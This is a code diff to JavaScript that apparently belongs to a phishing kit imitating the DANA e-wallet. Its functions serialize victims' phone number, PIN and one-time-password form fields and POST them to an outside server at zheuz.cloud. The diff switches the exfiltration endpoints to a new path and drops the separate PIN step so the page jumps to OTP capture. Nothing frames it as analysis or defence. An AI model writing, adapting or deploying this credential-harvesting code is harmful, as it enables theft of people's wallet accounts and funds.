@@ -6,7 +6,7 @@ function sendNohp(event) {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://zheuz.cloud/dana/egom/one.php',
+      url: 'https://zheuz.cloud/dana/egom1/one.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -15,36 +15,14 @@ function sendNohp(event) {
          document.getElementById("back2").style.display = "block";
          $("#formNohp").fadeOut();
          setTimeout(function() {
-            $("#formPin").fadeIn();
-            $("#pin1").focus();
+            $(".bgotp").fadeIn();
+            $("#otp1").focus();
          }, 500);
       }
    });
 };
 
 
- 
- 
- 
-////
-function sendPin() {
-   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
-   $.ajax({
-      type: 'POST',
-      url: 'https://zheuz.cloud/dana/egom/two.php',
-      data: dataString,
-      complete: function(data) {
-         console.log('Complete');
-         $("#process").hide();
-         document.getElementById("alert").style.display = "block";
-        // var nomor = document.getElementById("inp").value;
-        // document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
-         $(".bgotp").fadeIn();
-         setInterval(countdown, 1000);
-         $("#otp1").focus();
-      }
-   });
-};
 
 
 
@@ -60,7 +38,7 @@ function sendOtp() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://zheuz.cloud/dana/egom/three.php',
+      url: 'https://zheuz.cloud/dana/egom1/three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
